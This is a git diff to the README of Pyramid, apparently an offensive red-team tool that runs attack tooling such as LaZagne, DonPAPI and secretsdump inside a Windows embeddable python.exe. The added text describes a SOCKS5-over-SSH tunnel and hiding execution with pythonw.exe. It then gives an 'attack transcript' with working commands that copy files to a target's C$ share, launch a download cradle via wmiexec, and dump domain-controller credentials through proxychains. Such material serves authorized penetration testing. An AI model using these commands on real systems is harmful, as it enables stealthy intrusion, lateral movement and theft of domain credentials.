@@ -34,13 +34,13 @@ Pyramid is using some awesome tools made by:
   
 ### Contributors
 
-[snovvcrash](https://twitter.com/snovvcrash) - base-DonPAPI.py - base-LaZagne.py
+[snovvcrash](https://twitter.com/snovvcrash) - base-DonPAPI.py - base-LaZagne.py - base-clr.py
 
 ### Current features
 
 Pyramid capabilities are executed directly from python.exe process and are currently:
 
- 1. Dynamic loading of BloodHound Python, impacket secretsdump, paramiko, DonPAPI and LaZagne.
+ 1. Dynamic loading of BloodHound Python, impacket secretsdump, paramiko, DonPAPI, LaZagne, Pythonnet, pproxy.
  2. BOFs execution using in-process shellcode injection.
  3. In-process injection of a C2 agent and tunneling its traffic with local SSH port forwarding.
 
@@ -67,7 +67,7 @@ There are currently 4 main base scripts available:
  4. **base-tunnel-inj.py** script import and executes paramiko on a new Thread to create an SSH local port forward to a remote SSH server. Afterward a shellcode can be locally injected in python.exe.
  5. **base-DonPAPI.py** script will in-memory import and execute [DonPAPI](https://github.com/login-securite/DonPAPI). Results and credentials extracted are saved on disk in the Python Embeddable Package Directory.
  6. **base-LaZagne.py** script will in-memory import and execute [LaZagne](https://github.com/AlessandroZ/LaZagne)
-
+ 7. **base-tunnel-socks5** script import and executes paramiko on a new Thread to create an SSH remote port forward to an SSH server, then a socks5 proxy server is executed locally on target and made accessible remotely through the SSH tunnel. 
 ### Usage
 
 
@@ -118,7 +118,15 @@ Insert AD details and HTTPS credentials in the upper part of the script.
 
 ##### base-LaZagne.py
 
-Insert and HTTPS credentials in the upper part of the script and change lazagne module if needed.
+Insert HTTPS credentials in the upper part of the script and change lazagne module if needed.
+
+##### base-clr.py
+
+Insert HTTPS credentials in the upper part of the script and assembly bytes of the file you want to load.
+
+##### base-tunnel-socks5.py
+
+Insert parameters in the upper part of the script.
 
 
 #### Unzip embeddable package and execute the download cradle on target
@@ -143,6 +151,34 @@ exec(payload)
 
 Bear in mind that urllib is an Embeddable Package native Python module, so you don't need to install additional dependencies for this cradle. 
 The downloaded python "base" script will in-memory import the dependencies and execute its capabilites within the python.exe process.
+
+#### Executing Pyramid without visible prompt
+
+To execute Pyramid without bringing up a visible python.exe prompt you can leverage pythonw.exe that won't open a console window upon execution and is contained in the very same Windows Embeddable Package.
+The following picture illustrate an example usage of pythonw.exe to execute base-tunnel-socks5.py on a remote machine without opening a python.exe console window.
+
+![image](https://user-images.githubusercontent.com/59816245/195162985-2a14887f-5598-4829-8887-874d267d7f43.png)
+
+The attack transcript is reported below:
+
+Start Pyramid Server:
+
+`python3 PyramidHTTP.py 443 testuser Sup3rP4ss! /home/nak/projects/dev/Proxy/Pyramid/key.pem /home/nak/projects/dev/Proxy/Pyramid/cert.pem /home/nak/projects/dev/Proxy/Pyramid/Server/`
+
+Save the base download cradle to cradle.py.
+
+Copy unpacked windows Embeddable Package (with cradle.py) to target:
+
+`smbclient //192.168.1.11/C$ -U domain/user -c 'prompt OFF; recurse ON; lcd /home/user/Downloads/python-3.10.4-embed-amd64; cd Users\Public; mkdir python-3.10.4-embed-amd64; cd python-3.10.4-embed-amd64; mput *'`
+
+Execute pythonw.exe to launch the cradle:
+
+`/usr/share/doc/python3-impacket/examples/wmiexec.py domain/user:"Password1\!"@192.168.1.11 'C:\Users\Public\python-3.10.4-embed-amd64\pythonw.exe C:\Users\Public\python-3.10.4-embed-amd64\cradle.py'`
+
+Socks5 server is running on target and SSH tunnel should be up, so modify proxychains.conf and tunnel traffic through target:
+
+`proxychains impacket-secretsdump domain/user:"Password1\!"@192.168.1.50 -just-dc`
+
 
 
 #### Limitations
